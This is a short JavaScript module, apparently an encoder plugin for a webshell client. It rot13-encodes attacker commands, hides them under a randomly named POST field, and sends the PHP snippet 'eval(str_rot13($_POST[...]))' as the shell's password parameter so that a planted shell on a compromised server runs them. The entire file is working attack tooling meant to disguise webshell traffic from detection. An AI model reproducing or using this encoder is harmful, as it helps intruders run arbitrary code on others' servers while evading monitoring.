/**
 * php::str_rot13编码器
 * ? 利用php的 rot13 进行编码处理
 */


'use strict';

module.exports = (pwd, data) => {
  const encode = (s) => {
    //use a Regular Expression to Replace only the characters that are a-z or A-Z
    return s.replace(/[a-zA-Z]/g, function (c) {
        //Get the character code of the current character and add 13 to it
        //If it is larger than z's character code then subtract 26 to support wrap around.
        return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
    });
}

  // 生成一个随机变量名
  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
  data[randomID] = encode(data['_']);
  data[pwd] = `eval(str_rot13($_POST[${randomID}]));`;
  delete data['_'];
  return data;
}
